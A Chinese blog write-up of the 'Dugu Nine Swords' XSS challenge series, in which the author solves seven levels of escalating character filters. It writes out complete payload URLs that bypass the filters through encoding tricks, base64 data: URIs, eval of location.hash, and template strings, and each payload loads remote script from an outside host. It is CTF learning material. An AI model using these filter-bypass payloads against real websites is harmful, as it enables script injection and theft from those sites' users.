  * [![博客园Logo](/images/logo.svg?v=R9M0WmLAIPVydmdzE2keuvnjl-bPR7_35oHqtiBzGsM)](https://www.cnblogs.com/ "开发者的网上家园")
  * [首页](/)
  * [新闻](https://news.cnblogs.com/)
  * [博问](https://q.cnblogs.com/)
  * [专区](https://brands.cnblogs.com/)
  * [闪存](https://ing.cnblogs.com/)
  * [班级](https://edu.cnblogs.com/)

  * ![搜索](/images/aggsite/search.svg)
  * [ ![写随笔](/images/aggsite/newpost.svg) ](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔") [ ![我的博客](/images/aggsite/myblog.svg) ](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客") [ ![短消息](/images/aggsite/message.svg?v=J0WS2P2iPgaIVgXxcAhliw4AFZIpaTWxtdoNAv9eiCA) ](https://msg.cnblogs.com/ "短消息")

[ ![用户头像](/images/aggsite/avatar-default.svg) ](https://home.cnblogs.com/)

[我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
[我的园子](https://home.cnblogs.com/)
[账号设置](https://account.cnblogs.com/settings/account) [ 简洁模式 ![](/images/lite-
mode-check.svg)... ](javascript:void\(0\) "简洁模式会使用简洁款皮肤显示所有博客")
[退出登录](javascript:void\(0\))

[注册](https://account.cnblogs.com/signup/) [登录](javascript:void\(0\);)

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/--kisaragi--/)

# [\--Kisaragi--](https://www.cnblogs.com/--kisaragi--/)

##

  * [ 博客园](https://www.cnblogs.com/)
  * [ 首页](https://www.cnblogs.com/--kisaragi--/)
  * [ 新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
  * [ 联系](https://msg.cnblogs.com/send/--Kisaragi--)
  * [ 订阅](javascript:void\(0\))
  * [ 管理](https://i.cnblogs.com/)

#  [ 【XSS】XSS修炼之独孤九剑 ](https://www.cnblogs.com/--kisaragi--/p/15228152.html)

# 题目地址

[xcao.vip/test](https://xcao.vip/test)

# 题目作者给出的解题思路

[http://xcao.vip/test/xss/XSS修炼之独孤九剑.pdf](http://xcao.vip/test/xss%E4%BF%AE%E7%82%BC%E4%B9%8B%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91.pdf)

# 独孤九剑-第一式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/9794552df3c8435181f32a28449711f6.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **过滤了等号`=`、小括号 `()`，要求加载任意 JS 代码。成功加载 <http://xcao.vip/xss/alert.js>
> 表示完成挑战**

## 方法一

首先应该思考，在 JavaScript 中，加载 JS 代码，有哪些方式？

首先想到了

    
    
    <script src="http://xcao.vip/xss/alert.js"></script>
    

这是最基本的加载方式。

此时我们需要在页面中加载这个 JS 代码，应该想到使用 `document.write()`，将上面的代码写入 HTML 页面，从而执行 JS 代码。

那么如果要使用这个方法，还得在外面再使用一个 `<script>` 标签。即：

    
    
    <script>document.write(<script src="http://xcao.vip/xss/alert.js"></script>)</script>
    

然后再回到题目中来。

查看 HTML 代码：

    
    
    <html>
    	<head>
    		<meta charset="utf-8">
    		<title>独孤九剑-第一式  Design by 香草</title>
    	</head>
    	<body>
    		<h2>过滤了 =()，少侠骨骼惊奇，必是练武奇才</h2>
    		<h2>要求加载任意JS代码,成功加载http://xcao.vip/xss/alert.js 表示完成挑战</h2>
    	<input type="text" value="s">
    	</body>
    </html>
    

题目只有一个输入框，并且无法通过输入框提交内容。而同时我们注意到地址栏里有通过 GET 方式提交的参数：  
![在这里插入图片描述](https://img-blog.csdnimg.cn/26bdb9673cff4f52b8f74a804f35253b.png)  
尝试修改参数，成功修改了输入框中的内容：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/dfe1cecbc4b0466aa8a202326796e633.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
那么 XSS 攻击的点就在这里。

根据页面的源代码，自己构造的 XSS 攻击代码，首先应当将原本的 `<input>` 标签闭合，即在 `123123` 后面跟上 `">`：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/f05a58a2a6944be4bd1aad3cc6f8812e.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
从源代码中可以看到，自己输入的 `">` 成功将标签闭合，原本存在的 `">` 被孤立了出来：  
![在这里插入图片描述](https://img-blog.csdnimg.cn/8b537a89142542f88d3d84805c845a18.png)  
此时我们就可以在后面跟上我们自己的 JS 代码进行 XSS 攻击了：

    
    
    "><script>document.write(<script src="http://xcao.vip/xss/alert.js"></script>)</script>
    

但是别忘了题目的过滤条件，在这里等号 `=` 和小括号 `()` 不起作用。

接下来应当思考怎么绕过。

通过查找资料我们得知，可以 **用反引号代替小括号实现绕过** 。要绕过等号 `=` 的过滤，可以 **将`document.write()` 中的内容进行
Unicode 编码**，即：

    
    
    "><script>document.write`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`</script>
    

提交内容，成功绕过：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/f7f152281e5147feba92228ae8e7bc6f.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
完整 Payload：

    
    
    http://xcao.vip/test/xss1.php?data=123123"><script>document.write`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`</script>
    

## 方法二

题目作者给出的一种方法：

    
    
    http://xcao.vip/test/xss1.php?data=%22%3E%3Csvg%3E%3Cscript%3E%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23x68%3B%26%23x61%3B%26%23x73%3B%26%23x68%3B%26%23x2e%3B%26%23x73%3B%26%23x6c%3B%26%23x69%3B%26%23x63%3B%26%23x65%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x29%3B%3C/script%3E%3C/svg%3E#with(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/alert.js'
    

我们来分析这里用了些什么方法。

首先，原作者提到，自己使用了 `<svg>` 标签，是因为在 `<svg>` 标签中的 `<script>` 标签可以使用 HTML
编码，从而避开题目的过滤。

解码后的内容为：

    
    
    http://xcao.vip/test/xss1.php?data="><svg><script>&#x65;&#x76;&#x61;&#x6c;&#x28;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x61;&#x73;&#x68;&#x2e;&#x73;&#x6c;&#x69;&#x63;&#x65;&#x28;&#x31;&#x29;&#x29;</script></svg>#with(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/alert.js'
    

我们再将 HTML 编码进行解码，可得：

    
    
    http://xcao.vip/test/xss1.php?data="><svg><script>eval(location.hash.slice(1))</script></svg>#with(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/alert.js'
    

完整的构造这时才得以清晰展现在我们眼前。

首先是 `eval()` 函数，`eval()` 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。

如果参数是一个表达式，`eval()` 函数将执行表达式。如果参数是 JavaScript 语句，`eval()` 将 **执行 JavaScript
语句** 。

接下来是 `location.hash.slice(1)`，`hash` 是 `location` 对象中的一个属性，是一个可读可写的字符串，该字符串是
**URL 的锚部分（从`#` 号开始的部分）**。

而 **`slice(start, end)` 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分**。

`start` 参数字符串中第一个字符位置为 0，第二个字符位置为 1，以此类推。

因此，综上可得， **`location.hash.slice(1)` 的含义就是获取 `#` 号之后的内容**，即：

    
    
    with(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/alert.js'
    

这里的 `with` 用法其实也可以替换成

    
    
    document.body.appendChild(document.createElement('script')).src='http://xcao.vip/test/alert.js'
    

接下来进一步分析代码。

`appendChild()` 方法可向节点的子节点列表的末尾添加新的子节点。也就是说，从 DOM 树的角度，这个方法向 `body`
节点的子节点列表的最后添加了一个 `script` 节点，相当于 **直接添加了一个`<script>` 标签**。

这样一切都解释得通了。妙哉！

# 独孤九剑-第二式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/c2ad93f5e4a24ac68b37a9fc18a7e074.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **在第一式的基础之上，增加了对点`.` 的过滤**

## 方法一

在这种情况下，`document.write` 这样的用法肯定就不起作用了，得想想怎么绕过对点 `.` 的过滤。

通过查找资料我们可以得知，JavaScript 的对象的属性的读取可以通过类似 **数组** 的方式来进行，比如对象 `document` 的
`write` 方法就可以写成 `document['write']`。

这样就成功绕过了题目对点 `.` 的过滤。

基于第一式方法一，我们直接将 `document.write` 写成 `document['write']`，其他照旧，则有了：

    
    
    http://xcao.vip/test/xss1.php?data=123123"><script>document['write']`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`</script>
    

成功加载：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/3b631a3249a84c499f1488ce76e89587.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

## 方法二

同第一式方法二一样，由于本身构造的 `#` 锚点并不会作为参数被传入后台，并且经过 URL 解码后的 HTML 编码也不含有被过滤的点
`.`，因此第一式方法二的构造语句可以原封不动地拿来使用。即：

    
    
    http://xcao.vip/test/xss2.php?data=%22%3E%3Csvg%3E%3Cscript%3E%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23x68%3B%26%23x61%3B%26%23x73%3B%26%23x68%3B%26%23x2e%3B%26%23x73%3B%26%23x6c%3B%26%23x69%3B%26%23x63%3B%26%23x65%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x29%3B%3C/script%3E%3C/svg%3E#with(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/alert.js'
    

成功加载：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/4559fcf93aea443fbc728aa681ed3ac0.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

## 方法三

题目作者给出的一种方法：

    
    
    http://xcao.vip/test/xss2.php?data=xxx%22%3E%3Cscript%3EsetTimeout`\u0065\u0076\u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029`;%3C/script%3E#with(document)body.appendChild(createElement('script')).src='http://xcao.vip/xss/alert.js'
    

作者称，这样是通过 `setTimeout` 以及用反引号代替 `()`， 同时采用 Unicode 编码绕过对 `()`和 `.` 的限制。

在这串代码中，`setTimeout()` 是属于 `window` 的方法，该方法用于 **在指定的毫秒数后调用函数或计算表达式** 。

这里缺省了时间的参数，相当于不需要等待，直接执行。

中间的 Unicode 编码的内容还是之前的 `eval(location.hash.slice(1))`，总体上思路和第一式方法二差不多。

# 独孤九剑-第三式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/3a4a8945b3db4d1786287edb50dd3a74.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **放开了`=` 的过滤，新增了 `&#\` 的过滤**

## 方法一

新增了 `&#\` 的过滤，这明显就是冲着 HTML 编码和 Unicode 编码来的。

恶意不小啊😅😅😅

尝试将之前的 Payload 经过二次编码，想看看行不行，结果都没弹出来。仔细想想突然发现作者把 `=` 的过滤给放开了！！！

那不就可以考虑一下：

    
    
    <script src="http://xcao.vip/xss/alert.js"></script>
    

题目对点 `.` 进行了过滤，那么 URL 编码一下：

    
    
    <script src="http://xcao%252evip/xss/alert%252ejs"></script>
    

这里有个需要注意的地方，这里第一次将 `.` 进行 URL 编码后得到 `%2e`，但是还不够，通过 GET
方式提交上去后，浏览器会自动帮我们解码一次，又变回来了，那样的话 `.` 还是会被过滤。

因此需要再将 `%` 进行 URL 编码，得到 `%252e`。这样浏览器解码 `%25` 成 `%`，不会再对 `%2e`
进行解码，就可以绕过后端的过滤了。

成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/0d4ad968f6d045939c3afe7bf65ca1c7.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
提交之后的 HTML 代码就是这样的：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/d7c043515ffe4658a2ca87f65af47bdd.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
完整 Payload：

    
    
    http://xcao.vip/test/xss3.php?data="><script src="http://xcao%252evip/xss/alert%252ejs"></script>
    

这个方法也是题目作者使用的方法。

## 方法二

这个是在知乎上看到的一个方法。

先上 Payload：

    
    
    http://xcao.vip/test/xss3.php?data="><script src="http://2130706433"></script>
    

接下来分析一下这个作者的思路。

他想到的是利用 PHP 的 `302` 重定向，在本地写了一个 PHP 文件，文件的内容是这样的：

    
    
    <?php
    header("Location: http://xcao.vip/xss/alert.js");
    ?>
    

也就是说，当访问这个 PHP 文件的时候，会自动跳转到 <http://xcao.vip/xss/alert.js> 这个地址来。

然后他就在 Payload 中加载自己的本地 IP 地址，但前提是需要将自己本地的 Web 服务的网站首页修改成这个 PHP 文件。

接下来就会遇到一个问题：IP 地址中的 `.` 会遭到题目的过滤。于是这个作者将 IP 地址转换成了十进制形式：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/da30390001224186bcc296b3f5ed7426.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
然后就顺利实现了绕过：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/d31d2b703c3e429db2bfc0c418b66763.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
整体思路和方法一相比，大同小异，大体框架是一样的，就是对 `.`
的绕过方式不一样。从实现的简单程度来说，方法一明显要方便一些，但方法二也是值得思考的，说不定会用到更复杂的过滤情况呢🤔🤔🤔。

# 独孤九剑-第四式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/074621de450a4da7a581009cc4ad71f4.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **在上一题的基础之上，又新增了`=` 的过滤**

哦豁，这下 `src` 属性也用不了了😧😧😧

黔驴技穷，只能求助万能的网友了。

## 方法一

直接上 Payload：

    
    
    http://xcao.vip/test/xss4.php?data="><iframe></iframe><script>frames[0]['location']['replace']`data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly94Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg`</script>
    

然后分析这个代码是怎么一回事。

首先是 `<iframe>` 标签，这个标签是干嘛的？

`<iframe>` 标签规定一个内联框架，被用来在当前 HTML 文档中嵌入另一个文档。

说人话就是， **在一个网页中嵌入另外一个网页** ，就像下图这样：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/0fcbab872b4d4138959b9f13884d768d.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
可以通过 `src` 属性指定 URL。但是等号被过滤掉了，`src` 属性用不了，怎么办？

这时用到了 `frames[0].location.replace()` 这个东西。

首先来看 `frames` 这个属性，这个属性返回窗口中所有命名的框架。也就是说，这个属性会 **返回当前页面中所有的`iframe` 框架**，是一个类似
**数组** 的形式。

这里选择下标为 `0` 的框架，也就是第一个即我们自己构造的 `<iframe>` 标签。

然后，`location` 获取标签的 URL， **`location.replace(url)` 通过加载 URL
指定的文档来替换当前文档**，这个方法是替换当前窗口页面。

接下来就是最重要的 `data` 协议部分了。`text/html` 指定了数据格式，`base64` 指定了编码类型为 `base64` 编码。

在这之后，我们需要写入替换的代码，因为要加载目标代码，所以还是沿用之前的 `<script>` 标签：

    
    
    <script src="http://xcao.vip/xss/alert.js"></script>
    

然后将这段代码进行 `base64`
加密：`PHNjcmlwdCBzcmM9Imh0dHA6Ly94Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg`

成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/e0667c73e9a74229bd5d86adeb4c9459.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
以上就是这个方法所有的技术要点了。

整理一番下来，感觉又打开了新的大门😮😮😮

## 方法二

题目作者给出的一种做法。

Payload：

    
    
    http://xcao.vip/test/xss4.php?data="><script>location['replace']`javascript:eval%2528eval%2528location%252ehash%252eslice%25281%2529%2529%2529`</script>#with(document)body.appendChild(createElement('script')).src='http://xcao.vip/xss/alert.js'
    

和方法一有相似之处，也使用了 `location['replace']` 的做法。作者提到，他还用了 JavaScript 伪协议以及 URL 编码。

先来说说 JavaScript 伪协议。

伪协议不同于 HTTP 、FTP 这类标准化协议，它是一种 **非标准化** 的协议，主要应用于关联应用程序，较为特殊。

比如有的场景中会使用 `tencent://` 来关联 QQ，包括方法一使用的 `data:` 也是一种伪协议。

在 JavaScript 中，要使用伪协议，需要使用 **`javascript:`** 进行声明，比如：

    
    
    javascript:alert("hello world!")
    

这个特殊的协议类型声明了 **其主体是任意的 JavaScript 代码** ，它由 JavaScript 的解释器运行。

如果代码含有多个语句，必须使用分号 `;` 将这些语句分隔开。

回到这个方法中来，在使用伪协议之后，作者使用了 `eval(eval(location.hash.slice(1)))`，其中
`eval(location.hash.slice(1))` 得到了

    
    
    with(document)body.appendChild(createElement('script')).src='http://xcao.vip/xss/alert.js'
    

这一部分，然后再将这一部分执行，从而实现添加 `<script>` 标签。

值得注意的是，将 `eval(eval(location.hash.slice(1)))` 进行 URL 编码过后，仍需要对 `%` 进行二次编码。

执行结果：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/bcfae6502c614eadb1475508f162edfd.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

# 独孤九剑-第五式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/3b31ba3c9a604b9cbb9fc901dfbb44e8.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **在上一题基础上，新增了对`%` 的过滤，取消了对 `=` 的过滤。即在第三式基础上，增加对 `%` 的过滤**

好家伙，这下 URL 编码被 ban 掉了😅😅😅

## 方法一

回顾第三式的两个方法，由于新增对 `%` 的过滤，显然第一个方法已经不奏效了。

但我们惊奇地发现第二个方法貌似还能用。

因为是十进制编码，URL 中只含有数字，所以按理说能够成功绕过。

果不其然，成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/f829a6f46f5c48669b10647700a304a5.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
Payload：

    
    
    http://xcao.vip/test/xss5.php?data="><script src="http://2130706433"></script>
    

这个方法也是题目作者采用的方法。

## 方法二

在第四式中，我们使用了一个 `location['replace']` 搭配 `base64` 编码的方法，发现这个方法由于没有使用
`%`，同样也适用于这道题的场景。

索性直接照搬：

    
    
    http://xcao.vip/test/xss5.php?data="><iframe></iframe><script>frames[0]['location']['replace']`data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly94Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg`</script>
    

成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/e631c98637c1482d9ac5dc6401118381.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
直接套模板，这道题就做得很舒服😛😛😛

# 独孤九剑-第六式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/f658e57070554d9b8687b1874cd57471.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **在上一题基础上，增加对等号`=` 的过滤**

## 方法一

这一题的过滤依旧没能覆盖到 `base64` 所使用到的字符，所以 `base64` 直接杀疯了，连破三关！

    
    
    http://xcao.vip/test/xss6.php?data="><iframe></iframe><script>frames[0]['location']['replace']`data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly94Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg`</script>
    

成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/27e3c24c263045689ffea61b9a66629d.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

## 方法二

题目作者给出的一个方法。

Payload：

    
    
    http://xcao.vip/test/xss6.php/?data="><script>document['write']`<img ${location['hash']['slice']`1`}`</script>#/src='x'onerror=with(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/alert.js'//
    

作者提到自己受思维定势影响，很执着地要使用 `hash` 来保存攻击变量，走了不少弯路，最后还是发现，`base64` 真香！

让我们来看看作者的思路是怎样的。

为了绕过对 `.` 的过滤，作者使用了 `document['write']`，然后往界面写入了一个 `<img>` 标签。

在这个标签中，我们看到了一个 `${}` 的结构。

通过查找资料，我们得知，这个结构被称作 **模板字符串** ，而 `${}` 是模板字符串中的 **占位符** ，是 JavaScript 的版本标准
`ECMAScript 6.0`（简称 `ES6`）中的用法。

在模板字符串中，`{}` 中的内容可以是 **字符串** ，也可以是 **表达式** ，在输出模板字符串的时候，会
**先将表达式的值计算出来，然后再进行输出** 。

因此我们可以理解成，`<img>` 标签先执行了 `location.hash.slice(1)`，得到了：

    
    
    /src='x'onerror=with(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/alert.js'//
    

然后再嵌入到 `<img>` 标签中，就相当于往页面中插入了一个图片，链接为 `x` 发生错误，然后执行我们后面的 `with` 部分。

但是在这里我遇到了一点语法上的问题。

就是不明白这个 `src` 前面的 `/` 是怎么一回事。

从执行结果来看，不带 `/` 的话，`<img>` 标签中的 `src` 前面会加上一个逗号 `,`，进而使得这个标签的语法不正确：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/a33ddcf107084103951f69518d90e2a2.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)加上
`/` 过后，变成了这样：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/30420507ab61478f94a4a7e30867b63c.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)并且成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/2122177dbd9e4c16a7f7c7a3a3aca371.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
这个问题困扰了我很久，一直不知道怎么回事，也找了很多资料，都没看到有这方面的解释。

人麻了🙃🙃🙃

如果有大佬能看到并且知道原因的话，麻烦评论或者私信指点一下我吧，弟弟感激不尽！！！

# 独孤九剑-第七式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/6dd7e58b17cc4aa8b025176b5ca9bd41.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **在上一题的基础上，继续增加对`<`、`>` 的过滤，输出点从 `<input>` 标签变到了 `<script>` 标签中**

这下标签也不能用了，题目过滤越来越变态了😰😰😰

还是求助万能的网友。

## 方法一

Payload：

    
    
    http://xcao.vip/test/xss7.php?data="";document['write']`${String['fromCharCode']`60`%2B"iframe src"%2BString['fromCharCode']`61`%2B"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly94Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg"%2BString['fromCharCode']`62`}`
    

接下来分析一下思路。

由于输出点变了，到了 `<script>` 标签，所以要看看页面代码是怎样的，方便做闭合：  
![在这里插入图片描述](https://img-blog.csdnimg.cn/145f051edfd443088eb38b1060f5b4ec.png)  
接下来就尝试构造 `"";`，闭合前一条语句的同时，也将其与后面的语句隔断了，以便于我们构造后面的内容。

有点 SQL 堆叠注入的味道了。

然后又是使用 `document['write']`，往 HTML 页面写入内容。写入的是一个模板字符串，占位符非常长：

    
    
    ${String['fromCharCode']`60`%2B"iframe src"%2BString['fromCharCode']`61`%2B"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly94Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg"%2BString['fromCharCode']`62`}
    

首先是 `String['fromCharCode']()`，这个方法的作用是 **将 Unicode 编码转为一个字符** ，这里的
`String['fromCharCode'](60)` 就是 `<`。

然后根据模板字符串的语法，和字符串 `iframe` 之间，需要有一个 `+` 来进行拼接，但是需要注意的一点是，我们从始至终都是在题目的 URL 里面输入
Payload 的，纵观全局，这个 **`+` 现在处在的位置是在 URL 里面，如果不进行编码转换，会被当成空格**，那么就会出问题。

所以 `%2B` 就是这么来的。

同理，`String['fromCharCode'](61)` 是 `=`，`String['fromCharCode'](62)` 是
`>`，将模板字符串占位符中的代码翻译一下就是：

    
    
    <iframe src="data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly94Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg">
    

又回到了之前的 `base64` 大法，妙哉，妙哉！

## 方法二

题目作者给出的一种方法：

    
    
    http://xcao.vip/test/xss7.php/?data=1;[]['filter']['constructor']`a${location['hash']['slice']`1`}```#with(document)body.appendChild(createElement('script')).src='http://xcao.vip/xss/alert.js'
    

让我们来看看又用了些什么神奇的姿势。

